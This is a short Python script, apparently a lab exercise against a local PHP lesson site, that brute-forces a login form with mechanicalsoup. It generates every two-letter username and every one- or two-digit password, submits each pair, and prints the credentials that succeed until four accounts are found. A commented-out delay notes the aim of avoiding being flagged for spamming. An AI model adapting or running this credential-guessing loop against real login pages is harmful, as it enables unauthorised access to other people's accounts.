import itertools
import mechanicalsoup
import time

browser = mechanicalsoup.StatefulBrowser()

letters = "AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ"
numbers = "000111222333444555666777888999"
letters_list = list(letters)
numbers_list = list(numbers)

usernameList = []
passwordsList = []
users = []


def gen_username():
    List = itertools.permutations(letters_list, 2)  # generates all words of length 2
    for i in list(List):
        if usernameList.count(''.join(i)) == 0:  # count --> check if the word is added before or not
            usernameList.insert(len(usernameList), ''.join(i))  # join-->turns ['a','b'] into ab (from array to string)


def gen_passwords():
    for i in range(1, 3):
        List = itertools.permutations(numbers_list, i)  # generates all words of length 1 and 2
        for i in list(List):
            if passwordsList.count(''.join(i)) == 0:  # count --> check if the word is added before or not
                passwordsList.insert(len(passwordsList), ''.join(i))


def login(username, password):
    # time.sleep(0.5) #sleep between requests to avoid being accused of spamming
    browser.open("http://localhost/phplessons/index.php")  # opens the intended website
    browser.select_form('form[action="nav.php"]')  # choose the form
    browser['username'] = username  # sets form username value with our username
    browser['password'] = password  # sets form password value with our password
    response = browser.submit_selected()  # response after submitting
    if "Welcome!" in response.text:  # checks if the response has welcome in it
        if users.count(username) == 0:
            users.insert(len(users), username)
            print("Username: " + username + " ")
            print("Password: " + password + "\n")
            return True
    return False


gen_username()
gen_passwords()

for i in list(usernameList):
    for j in list(passwordsList):
        if login(i, j):  # tries username and password combinations
            break  # if a password of the current username was found break from passwords loop and try another username
    if len(users) == 4:  # terminates when 4 user credentials are found
        break
